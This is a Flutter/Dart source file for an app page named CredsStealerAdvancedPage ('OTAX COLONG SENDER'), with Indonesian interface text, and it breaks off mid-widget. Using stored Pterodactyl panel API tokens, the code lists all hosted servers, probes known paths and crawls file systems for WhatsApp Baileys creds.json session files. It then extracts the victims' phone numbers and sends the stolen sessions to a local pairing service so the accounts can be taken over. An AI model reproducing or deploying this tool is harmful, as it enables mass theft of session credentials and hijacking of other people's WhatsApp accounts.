
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'main.dart';
class CredsStealerAdvancedPage extends StatefulWidget {
  final String username;
  final String role;

  const CredsStealerAdvancedPage({
    super.key,
    required this.username,
    required this.role,
  });

  @override
  State<CredsStealerAdvancedPage> createState() => _CredsStealerAdvancedPageState();
}

class _CredsStealerAdvancedPageState extends State<CredsStealerAdvancedPage> 
    with SingleTickerProviderStateMixin {
  final Color primaryDark = const Color(0xFF0C0C0F);
  final Color cyberBlue = const Color(0xFF7B8FF7);
  final Color cyberPurple = const Color(0xFF7B8FF7);
  final Color successGreen = const Color(0xFF52B788);
  final Color warningOrange = const Color(0xFF7B8FF7);
  final Color cardDark = const Color(0xFF131318);
  final Color primaryWhite = Colors.white;
  final Color deepRed = const Color(0xFFD96B6B);

  List<Map<String, dynamic>> _adpList = [];
  String? _selectedAdpKey;
  List<Map<String, dynamic>> _serversList = [];
  List<String> _selectedServerIds = [];
  List<Map<String, dynamic>> _foundCreds = [];
  Map<String, dynamic>? _selectedCreds;
  String _credsContent = '';
  
  bool _isLoading = false;
  bool _isScanning = false;
  bool _isConnecting = false;
  bool _scanAllServers = false;
  bool _autoConnect = true;
  int _scanProgress = 0;
  int _totalServersScanned = 0;
  int _totalCredsFound = 0;
  int _maxScanDepth = 7;
  int _maxConcurrentScans = 3;
  
  final List<String> _quickPaths = [
    '/creds.json',
    '/session/creds.json',
    '/sessions/creds.json',
    '/auth/creds.json',
    '/data/creds.json',
    '/bot/creds.json',
    '/baileys/creds.json',
    '/baileys-md/creds.json',
    '/home/container/creds.json',
    '/home/container/session/creds.json',
    '/home/container/baileys/creds.json',
  ];

  late AnimationController _animationController;
  late Animation<double> _fadeAnimation;

  final String _storageKey = 'otax_adp_data';
  

  @override
  void initState() {
    super.initState();
    _animationController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 500),
    );
    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _animationController, curve: Curves.easeInOut),
    );
    _animationController.forward();
    _loadAdpFromLocal();
  }

  @override
  void dispose() {
    _animationController.dispose();
    super.dispose();
  }

  Future<void> _loadAdpFromLocal() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final String? encryptedData = prefs.getString('${_storageKey}_${widget.username}');
      
      if (encryptedData != null) {
        final jsonData = jsonDecode(encryptedData);
        setState(() {
          _adpList = List<Map<String, dynamic>>.from(jsonData);
          if (_adpList.isNotEmpty) _selectedAdpKey = _adpList.first['alias'];
        });
      }
    } catch (e) {
      _showSnackBar('Error loading ADP: $e', isError: true);
    }
  }

  bool _isPtlc(String token) => token.toLowerCase().startsWith('ptlc_');
  bool _isPtla(String token) => token.toLowerCase().startsWith('ptla_');
  
  String _ensureHttps(String url) {
    if (!url.startsWith('http')) return 'https://$url';
    return url.replaceFirst('http://', 'https://');
  }

  Future<void> _fetchServers() async {
    if (_selectedAdpKey == null) {
      _showSnackBar('Pilih ADP terlebih dahulu!', isError: true);
      return;
    }

    setState(() {
      _isLoading = true;
      _serversList.clear();
      _selectedServerIds.clear();
      _foundCreds.clear();
    });

    try {
      final selectedAdp = _adpList.firstWhere((adp) => adp['alias'] == _selectedAdpKey);
      final domain = _ensureHttps(selectedAdp['domain']);
      final ptla = selectedAdp['ptla'];
      final ptlc = selectedAdp['ptlc'] ?? '';

      List<Map<String, dynamic>> servers = [];

      if (_isPtlc(ptlc)) {
        try {
          servers = await _listServersClient(domain, ptlc);
        } catch (e) {}
      }

      if (servers.isEmpty && _isPtla(ptla)) {
        try {
          servers = await _listServersApplication(domain, ptla);
        } catch (e) {}
      }

      setState(() {
        _serversList = servers;
        if (_scanAllServers && servers.isNotEmpty) {
          _selectedServerIds = servers.map((s) => s['id'] as String).toList();
        }
      });

      if (servers.isEmpty) {
        _showSnackBar('Tidak ada server ditemukan', isError: true);
      } else {
        _showSnackBar('Ditemukan ${servers.length} server', isError: false);
      }
    } catch (e) {
      _showSnackBar('Gagal mengambil server: $e', isError: true);
    } finally {
      setState(() => _isLoading = false);
    }
  }

  Future<List<Map<String, dynamic>>> _listServersClient(String domain, String token) async {
    final List<Map<String, dynamic>> servers = [];
    int page = 1;

    while (true) {
      final response = await http.get(
        Uri.parse('$domain/api/client/servers?page=$page&per_page=100'),
        headers: {
          'Accept': 'application/json',
          'Authorization': 'Bearer $token',
        },
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final List<dynamic> serverList = data['data'] ?? [];

        for (final server in serverList) {
          final attrs = server['attributes'];
          servers.add({
            'id': attrs['identifier'],
            'name': attrs['name'] ?? attrs['identifier'],
            'memory': attrs['limits']?['memory'] ?? 0,
            'disk': attrs['limits']?['disk'] ?? 0,
          });
        }

        final pagination = data['meta']?['pagination'];
        if (page >= (pagination?['total_pages'] ?? 1)) break;
        page++;
      } else {
        break;
      }
    }

    return servers;
  }

  Future<List<Map<String, dynamic>>> _listServersApplication(String domain, String token) async {
    final List<Map<String, dynamic>> servers = [];
    int page = 1;

    while (true) {
      final response = await http.get(
        Uri.parse('$domain/api/application/servers?page=$page&per_page=100'),
        headers: {
          'Accept': 'application/json',
          'Authorization': 'Bearer $token',
        },
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final List<dynamic> serverList = data['data'] ?? [];

        for (final server in serverList) {
          final attrs = server['attributes'];
          final id = attrs['identifier'] ?? attrs['uuid_short'] ?? attrs['uuid'];
          servers.add({
            'id': id,
            'name': attrs['name'] ?? id,
            'memory': attrs['limits']?['memory'] ?? 0,
            'disk': attrs['limits']?['disk'] ?? 0,
          });
        }

        final pagination = data['meta']?['pagination'];
        if (page >= (pagination?['total_pages'] ?? 1)) break;
        page++;
      } else {
        break;
      }
    }

    return servers;
  }

  Future<void> _scanForCreds() async {
    if (_selectedAdpKey == null) {
      _showSnackBar('Pilih ADP terlebih dahulu!', isError: true);
      return;
    }

    if (!_scanAllServers && _selectedServerIds.isEmpty) {
      _showSnackBar('Pilih server atau aktifkan scan semua!', isError: true);
      return;
    }

    setState(() {
      _isScanning = true;
      _scanProgress = 0;
      _totalServersScanned = 0;
      _totalCredsFound = 0;
      _foundCreds.clear();
      _selectedCreds = null;
      _credsContent = '';
    });

    try {
      final selectedAdp = _adpList.firstWhere((adp) => adp['alias'] == _selectedAdpKey);
      final domain = _ensureHttps(selectedAdp['domain']);
      final ptla = selectedAdp['ptla'];
      final ptlc = selectedAdp['ptlc'] ?? '';

      final serversToScan = _scanAllServers 
          ? _serversList 
          : _serversList.where((s) => _selectedServerIds.contains(s['id'])).toList();

      if (serversToScan.isEmpty) {
        _showSnackBar('Tidak ada server untuk discan', isError: true);
        return;
      }

      // Scan server secara paralel dengan batasan
      final List<Future<void>> scanFutures = [];
      int completed = 0;

      for (int i = 0; i < serversToScan.length; i++) {
        final server = serversToScan[i];
        
        scanFutures.add(_scanSingleServer(domain, ptlc, ptla, server).then((credsList) {
          setState(() {
            _foundCreds.addAll(credsList);
            _totalCredsFound = _foundCreds.length;
            _totalServersScanned = completed + 1;
            _scanProgress = ((completed + 1) * 100 ~/ serversToScan.length);
          });
          completed++;
        }));

        // Batasi concurrent scans
        if (scanFutures.length >= _maxConcurrentScans) {
          await Future.wait(scanFutures);
          scanFutures.clear();
        }
      }

      // Tunggu sisa scan
      if (scanFutures.isNotEmpty) {
        await Future.wait(scanFutures);
      }

      if (_foundCreds.isEmpty) {
        _showSnackBar('Tidak ditemukan creds.json di semua server', isError: false);
      } else {
        _showSnackBar('Ditemukan $_totalCredsFound creds dari $_totalServersScanned server', isError: false);
        if (_foundCreds.isNotEmpty) {
          setState(() {
            _selectedCreds = _foundCreds.first;
            _credsContent = _selectedCreds!['content'] ?? '';
          });
        }
      }
    } catch (e) {
      _showSnackBar('Error scanning: $e', isError: true);
    } finally {
      setState(() => _isScanning = false);
    }
  }

  Future<List<Map<String, dynamic>>> _scanSingleServer(
    String domain, String ptlc, String ptla, Map<String, dynamic> server) async {
    
    final serverId = server['id'];
    final List<Map<String, dynamic>> foundInThisServer = [];

    // Coba path cepat terlebih dahulu
    for (final path in _quickPaths) {
      try {
        final content = await _readFile(domain, ptlc, ptla, serverId, path);
        if (content.isNotEmpty) {
          foundInThisServer.add({
            'server_id': serverId,
            'server_name': server['name'],
            'path': path,
            'content': content,
            'timestamp': DateTime.now().toIso8601String(),
          });
        }
      } catch (e) {
        continue;
      }
    }

    // Jika tidak ditemukan di path cepat, coba deep scan
    if (foundInThisServer.isEmpty) {
      final deepScanResult = await _deepScan(domain, ptlc, ptla, serverId);
      foundInThisServer.addAll(deepScanResult.map((path) => ({
        'server_id': serverId,
        'server_name': server['name'],
        'path': path,
        'content': '', // Isi nanti saat dibaca
        'timestamp': DateTime.now().toIso8601String(),
      })));
    }

    // Baca konten untuk yang ditemukan di deep scan
    for (final creds in foundInThisServer.where((c) => c['content'] == '')) {
      try {
        final content = await _readFile(domain, ptlc, ptla, serverId, creds['path']);
        creds['content'] = content;
      } catch (e) {
        // Hapus jika gagal membaca
        foundInThisServer.remove(creds);
      }
    }

    return foundInThisServer;
  }

  Future<List<String>> _deepScan(String domain, String ptlc, String ptla, String serverId) async {
    final List<String> foundPaths = [];
    final List<String> queue = ['/', '/home', '/home/container', '/container'];
    final Set<String> visited = {};
    int depth = 0;
    int maxDepth = _maxScanDepth;
    int maxDirs = 2000; // Batasi untuk performa
    int expanded = 0;

    while (queue.isNotEmpty && depth <= maxDepth && expanded < maxDirs) {
      final currentLevel = queue.length;
      
      for (int i = 0; i < currentLevel && expanded < maxDirs; i++) {
        final dir = queue.removeAt(0);
        if (visited.contains(dir)) continue;
        
        visited.add(dir);
        expanded++;

        try {
          final items = await _listDirectory(domain, ptlc, ptla, serverId, dir);
          
          for (final item in items) {
            final name = item['name'];
            final isDir = item['is_dir'];
            final fullPath = '${dir == '/' ? '' : dir}/$name';

            if (isDir) {
              if (_shouldSkipDir(name)) continue;
              queue.add(fullPath);
            } else {
              if (name.toLowerCase() == 'creds.json' || _isNumberJson(name)) {
                foundPaths.add(fullPath);
              }
            }
          }
        } catch (e) {
          continue;
        }
      }
      
      depth++;
    }

    return foundPaths;
  }

  bool _shouldSkipDir(String dirName) {
    final skipPatterns = [
      r'^proc$', r'^sys$', r'^dev$', r'^run$', r'^tmp$', r'^var$',
      r'^lib$', r'^usr$', r'^bin$', r'^sbin$', r'^etc$', r'^\.cache$',
      r'^\.git$', r'^node_modules$', r'^\.npm$', r'^\.yarn$',
    ];

    for (final pattern in skipPatterns) {
      if (RegExp(pattern, caseSensitive: false).hasMatch(dirName)) {
        return true;
      }
    }
    return false;
  }

  bool _isNumberJson(String fileName) {
    return RegExp(r'^\d{6,24}\.json$').hasMatch(fileName);
  }

  Future<List<Map<String, dynamic>>> _listDirectory(
    String domain, String ptlc, String ptla, String serverId, String dir) async {
    
    final encodedDir = Uri.encodeComponent(_normalizePath(dir));
    
    if (_isPtlc(ptlc)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/client/servers/$serverId/files/list?directory=$encodedDir'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptlc',
          },
        );

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          final List<dynamic> items = data['data'] ?? [];
          
          return items.map<Map<String, dynamic>>((item) {
            final attrs = item['attributes'] ?? item;
            return {
              'name': attrs['name']?.toString() ?? '',
              'is_dir': !(attrs['is_file'] ?? false) ||
                        (attrs['type']?.toString().toLowerCase() == 'directory'),
            };
          }).toList();
        }
      } catch (e) {}
    }

    if (_isPtla(ptla)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/application/servers/$serverId/files/list?directory=$encodedDir'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptla',
          },
        );

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          final List<dynamic> items = data['data'] ?? [];
          
          return items.map<Map<String, dynamic>>((item) {
            final attrs = item['attributes'] ?? item;
            return {
              'name': attrs['name']?.toString() ?? '',
              'is_dir': !(attrs['is_file'] ?? false) ||
                        (attrs['type']?.toString().toLowerCase() == 'directory'),
            };
          }).toList();
        }
      } catch (e) {}
    }

    return [];
  }

  Future<String> _readFile(String domain, String ptlc, String ptla, String serverId, String filePath) async {
    final encodedFile = Uri.encodeComponent(_normalizePath(filePath));
    
    if (_isPtlc(ptlc)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/client/servers/$serverId/files/contents?file=$encodedFile'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptlc',
          },
        );

        if (response.statusCode == 200) {
          return response.body;
        }
      } catch (e) {}
    }

    if (_isPtla(ptla)) {
      try {
        final response = await http.get(
          Uri.parse('$domain/api/application/servers/$serverId/files/contents?file=$encodedFile'),
          headers: {
            'Accept': 'application/json',
            'Authorization': 'Bearer $ptla',
          },
        );

        if (response.statusCode == 200) {
          return response.body;
        }
      } catch (e) {}
    }

    throw Exception('Gagal membaca file');
  }

  void _toggleServerSelection(String serverId) {
    setState(() {
      if (_selectedServerIds.contains(serverId)) {
        _selectedServerIds.remove(serverId);
      } else {
        _selectedServerIds.add(serverId);
      }
    });
  }

  void _toggleSelectAllServers(bool selectAll) {
    setState(() {
      if (selectAll) {
        _selectedServerIds = _serversList.map((s) => s['id'] as String).toList();
      } else {
        _selectedServerIds.clear();
      }
    });
  }

  Future<void> _connectSelectedCreds() async {
    if (_selectedCreds == null || _credsContent.isEmpty) {
      _showSnackBar('Pilih creds terlebih dahulu!', isError: true);
      return;
    }

    await _connectToOtax(_selectedCreds!);
  }

  Future<void> _connectAllCreds() async {
    if (_foundCreds.isEmpty) {
      _showSnackBar('Tidak ada creds yang ditemukan!', isError: true);
      return;
    }

    setState(() => _isConnecting = true);

    int successCount = 0;
    int failCount = 0;

    for (final creds in _foundCreds) {
      try {
        await _connectToOtax(creds);
        successCount++;
      } catch (e) {
        failCount++;
        print('Gagal connect creds dari ${creds['server_name']}: $e');
      }
    }

    setState(() => _isConnecting = false);
    
    _showSnackBar(
      '✅ $successCount berhasil, ❌ $failCount gagal dihubungkan',
      isError: failCount > 0,
    );
  }

  Future<void> _connectToOtax(Map<String, dynamic> credsData) async {
    final content = credsData['content'];
    if (content.isEmpty) return;

    try {
      final credsJson = jsonDecode(content);
      String? number;
      
      if (credsJson['me']?['id'] != null) {
        final meId = credsJson['me']['id'].toString();
        if (meId.contains('@s.whatsapp.net')) {
          number = meId.split('@')[0];
        }
      }
      
      if (number == null && credsJson['wid'] != null) {
        final wid = credsJson['wid'].toString();
        if (wid.contains('@s.whatsapp.net')) {
          number = wid.split('@')[0];
        }
      }
      
      if (number == null) {
        final matches = RegExp(r'"(\d{10,15})@s\.whatsapp\.net"').allMatches(content);
        if (matches.isNotEmpty) {
          number = matches.first.group(1);
        }
      }

      if (number == null) {
        _showSnackBar('Tidak dapat menemukan nomor WhatsApp', isError: true);
        return;
      }

      final response = await http.post(
        Uri.parse('http://127.0.0.1:4113/api/pair-from-creds'),
        headers: {
          'Content-Type': 'application/json',
          'X-Username': widget.username,
        },
        body: jsonEncode({
          'creds': credsJson,
          'number': number,
          'owner': widget.username,
          'adp_alias': _selectedAdpKey,
          'server_id': credsData['server_id'],
          'server_name': credsData['server_name'],
          'path': credsData['path'],
        }),
      );

      if (response.statusCode == 200) {
        final result = jsonDecode(response.body);
        
        if (result['success'] == true) {
          _showSnackBar('✅ ${credsData['server_name']} berhasil dihubungkan!', isError: false);
          await _saveSessionToLocal(number, result['session_data']);
        } else {
          _showSnackBar('❌ ${credsData['server_name']} gagal: ${result['error']}', isError: true);
        }
      }
    } catch (e) {
      _showSnackBar('Error connecting: $e', isError: true);
    }
  }

  Future<void> _saveSessionToLocal(String number, Map<String, dynamic> sessionData) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final sessions = prefs.getStringList('otax_sessions_${widget.username}') ?? [];
      if (!sessions.contains(number)) {
        sessions.add(number);
        await prefs.setStringList('otax_sessions_${widget.username}', sessions);
      }
      
      await prefs.setString(
        'otax_session_${widget.username}_$number',
        jsonEncode(sessionData),
      );
    } catch (e) {
      print('Error saving session: $e');
    }
  }

  String _normalizePath(String path) {
    String p = path.replaceAll(r'\', '/').replaceAll(RegExp(r'/{2,}'), '/');
    p = p.replaceAll(RegExp(r'^/?(?:home/)?container/', caseSensitive: false), '/');
    if (!p.startsWith('/')) p = '/$p';
    if (p != '/' && p.endsWith('/')) p = p.substring(0, p.length - 1);
    return p;
  }

  void _showSnackBar(String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(isError ? Icons.error : Icons.check_circle, color: Colors.white),
            const SizedBox(width: 12),
            Expanded(child: Text(message, style: const TextStyle(fontFamily: 'Orbitron', fontSize: 14))),
          ],
        ),
        backgroundColor: isError ? const Color(0xFF4A1A1A) : const Color(0xFF1A2E1F),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        margin: const EdgeInsets.all(20),
        duration: const Duration(seconds: 3),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(24, 40, 24, 24),
      decoration: BoxDecoration(
        color: const Color(0xFF131318),
        border: Border(
          bottom: BorderSide(color: Colors.white.withOpacity(0.06)),
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: cyberBlue.withOpacity(0.12),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: cyberBlue.withOpacity(0.25)),
                ),
                child: Icon(Icons.security, color: cyberBlue, size: 26),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.04),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: Colors.white.withOpacity(0.08)),
                ),
                child: Row(
                  children: [
                    Icon(Icons.person, color: Colors.white.withOpacity(0.4), size: 15),
                    const SizedBox(width: 8),
                    Text(
                      widget.username,
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.65),
                        fontSize: 13,
                        fontFamily: 'ShareTechMono',
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 22),
          Text(
            "OTAX COLONG SENDER",
            style: TextStyle(
              fontSize: 26,
              fontWeight: FontWeight.w700,
              fontFamily: 'Orbitron',
              letterSpacing: 0.8,
              color: Colors.white,
            ),
          ),
          const SizedBox(height: 6),
          Text(
            "Scan semua server atau pilih server tertentu",
            style: TextStyle(
              color: Colors.white.withOpacity(0.35),
              fontSize: 13,
              fontFamily: 'ShareTechMono',
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAdpSelector() {
    return _buildGlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.cloud, color: cyberBlue),
              const SizedBox(width: 10),
              Text(
                'PILIH ADP',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.85),
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'Orbitron',
                  letterSpacing: 0.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          if (_adpList.isEmpty)
            Center(
              child: Column(
                children: [
                  Icon(Icons.cloud_off, color: Colors.white30, size: 48),
                  const SizedBox(height: 12),
                  Text(
                    'Belum ada ADP',
                    style: TextStyle(color: Colors.white, fontSize: 16),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    'Simpan ADP terlebih dahulu di halaman Cpanel',
                    style: TextStyle(color: Colors.white70, fontSize: 12),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            )
          else
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.04),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white.withOpacity(0.08)),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  value: _selectedAdpKey,
                  isExpanded: true,
                  dropdownColor: const Color(0xFF181820),
                  icon: Icon(Icons.keyboard_arrow_down, color: cyberBlue.withOpacity(0.7), size: 20),
                  style: TextStyle(color: primaryWhite, fontFamily: 'ShareTechMono', fontSize: 14),
                  items: _adpList.map((adp) {
                    return DropdownMenuItem<String>(
                      value: adp['alias'],
                      child: Row(
                        children: [
                          Icon(Icons.cloud_queue, color: cyberBlue.withOpacity(0.6), size: 15),
                          const SizedBox(width: 10),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(adp['alias'], style: const TextStyle(color: Colors.white, fontSize: 13)),
                                Text(
                                  adp['domain'],
                                  style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 11),
                                  overflow: TextOverflow.ellipsis,
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() {
                      _selectedAdpKey = value;
                      _serversList.clear();
                      _selectedServerIds.clear();
                      _foundCreds.clear();
                      _credsContent = '';
                    });
                  },
                ),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildServerSelection() {
    return _buildGlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.storage, color: cyberBlue),
              const SizedBox(width: 10),
              Text(
                'PILIH SERVER',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.85),
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'Orbitron',
                  letterSpacing: 0.5,
                ),
              ),
              const Spacer(),
              if (_selectedAdpKey != null)
                ElevatedButton(
                  onPressed: _isLoading ? null : _fetchServers,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: cyberBlue.withOpacity(0.2),
                    foregroundColor: cyberBlue,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(8),
                      side: BorderSide(color: cyberBlue),
                    ),
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  ),
                  child: _isLoading
                      ? const SizedBox(
                          height: 16,
                          width: 16,
                          child: CircularProgressIndicator(strokeWidth: 2),
                        )
                      : Text(
                          'REFRESH',
                          style: TextStyle(fontSize: 12, fontFamily: 'Orbitron'),
                        ),
                ),
            ],
          ),
          const SizedBox(height: 16),
          
          // Toggle Scan Semua
          Row(
            children: [
              Transform.scale(
                scale: 0.9,
                child: Switch(
                  value: _scanAllServers,
                  activeColor: cyberBlue,
                  activeTrackColor: cyberBlue.withOpacity(0.3),
                  inactiveTrackColor: Colors.white30,
                  onChanged: (value) {
                    setState(() {
                      _scanAllServers = value;
                      if (value) {
                        _selectedServerIds = _serversList.map((s) => s['id'] as String).toList();
                      } else {
                        _selectedServerIds.clear();
                      }
                    });
                  },
                ),
              ),
              Text(
                'SCAN SEMUA SERVER',
                style: TextStyle(
                  color: _scanAllServers ? cyberBlue : Colors.white70,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                ),
              ),
            ],
          ),
          
          const SizedBox(height: 16),
          
          if (_serversList.isEmpty)
            Center(
              child: Column(
                children: [
                  Icon(Icons.storage_outlined, color: Colors.white30, size: 48),
                  const SizedBox(height: 12),
                  Text(
                    'Belum ada server',
                    style: TextStyle(color: Colors.white, fontSize: 16),
                  ),
                  const SizedBox(height: 8),
                  Text(
                    'Klik REFRESH untuk mengambil daftar server',
                    style: TextStyle(color: Colors.white70, fontSize: 12),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            )
          else if (!_scanAllServers)
            Column(
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Text(
                      'Pilih server manual:',
                      style: TextStyle(color: Colors.white70, fontSize: 14),
                    ),
                    Row(
                      children: [
                        ElevatedButton(
                          onPressed: () => _toggleSelectAllServers(true),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: cyberBlue.withOpacity(0.2),
                            foregroundColor: cyberBlue,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(6),
                            ),
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                          ),
                          child: Text(
                            'PILIH SEMUA',
                            style: TextStyle(fontSize: 10, fontFamily: 'Orbitron'),
                          ),
                        ),
                        const SizedBox(width: 8),
                        ElevatedButton(
                          onPressed: () => _toggleSelectAllServers(false),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: deepRed.withOpacity(0.2),
                            foregroundColor: deepRed,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(6),
                            ),
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                          ),
                          child: Text(
                            'BATAL SEMUA',
                            style: TextStyle(fontSize: 10, fontFamily: 'Orbitron'),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                Container(
                  height: 200,
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.white.withOpacity(0.06)),
                  ),
                  child: ListView.builder(
                    padding: const EdgeInsets.all(8),
                    itemCount: _serversList.length,
                    itemBuilder: (context, index) {
                      final server = _serversList[index];
                      final isSelected = _selectedServerIds.contains(server['id']);
                      
                      return Card(
                        color: isSelected
                            ? cyberBlue.withOpacity(0.1)
                            : Colors.white.withOpacity(0.03),
                        elevation: 0,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(10),
                          side: BorderSide(
                            color: isSelected
                                ? cyberBlue.withOpacity(0.5)
                                : Colors.white.withOpacity(0.06),
                            width: 1,
                          ),
                        ),
                        child: ListTile(
                          dense: true,
                          leading: Icon(
                            isSelected ? Icons.check_circle_outline : Icons.radio_button_unchecked,
                            color: isSelected ? cyberBlue : Colors.white.withOpacity(0.3),
                            size: 20,
                          ),
                          title: Text(
                            server['name'],
                            style: TextStyle(
                              color: Colors.white.withOpacity(0.9),
                              fontWeight: FontWeight.w500,
                              fontSize: 13,
                            ),
                          ),
                          subtitle: Text(
                            'ID: ${server['id']} · RAM: ${server['memory']}MB',
                            style: TextStyle(color: Colors.white.withOpacity(0.35), fontSize: 10),
                          ),
                          trailing: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(8),
                            ),
                            child: Text(
                              '${server['memory']}MB',
                              style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 10),
                            ),
                          ),
                          onTap: () => _toggleServerSelection(server['id'] as String),
                        ),
                      );
                    },
                  ),
                ),
              ],
            )
          else
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: cyberBlue.withOpacity(0.08),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: cyberBlue.withOpacity(0.25)),
              ),
              child: Row(
                children: [
                  Icon(Icons.all_inclusive, color: cyberBlue.withOpacity(0.7), size: 20),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'SCAN SEMUA SERVER AKTIF',
                          style: TextStyle(
                            color: cyberBlue,
                            fontWeight: FontWeight.w600,
                            fontSize: 13,
                            fontFamily: 'Orbitron',
                          ),
                        ),
                        Text(
                          '${_serversList.length} server akan discan otomatis',
                          style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 11),
                        ),
                      ],
                    ),
                  ),
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(
                      color: cyberBlue.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: Text(
                      '${_serversList.length}',
                      style: TextStyle(color: cyberBlue, fontSize: 12, fontWeight: FontWeight.bold),
                    ),
                  ),
                ],
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildScanSection() {
    return _buildGlassCard(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.search, color: cyberBlue),
              const SizedBox(width: 10),
              Text(
                'SCAN CREDS.JSON',
                style: TextStyle(
                  color: Colors.white.withOpacity(0.85),
                  fontSize: 14,
                  fontWeight: FontWeight.w600,
                  fontFamily: 'Orbitron',
                  letterSpacing: 0.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          
          if (_isScanning)
            Column(
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(4),
                  child: LinearProgressIndicator(
                    value: _scanProgress / 100,
                    backgroundColor: Colors.white.withOpacity(0.08),
                    color: cyberBlue,
                    minHeight: 4,
                  ),
                ),
                const SizedBox(height: 14),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Text(
                      'Memindai... $_scanProgress%',
                      style: TextStyle(color: Colors.white.withOpacity(0.5), fontSize: 12, fontFamily: 'ShareTechMono'),
                    ),
                    Text(
                      '$_totalServersScanned/${_scanAllServers ? _serversList.length : _selectedServerIds.length} server',
                      style: TextStyle(color: cyberBlue, fontSize: 12, fontFamily: 'ShareTechMono'),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                Text(
                  'Creds ditemukan: $_totalCredsFound',
                  style: TextStyle(color: successGreen, fontSize: 12, fontFamily: 'ShareTechMono'),
                ),
              ],
            )
          else
            ElevatedButton(
              onPressed: () {
                if (_scanAllServers && _serversList.isEmpty) {
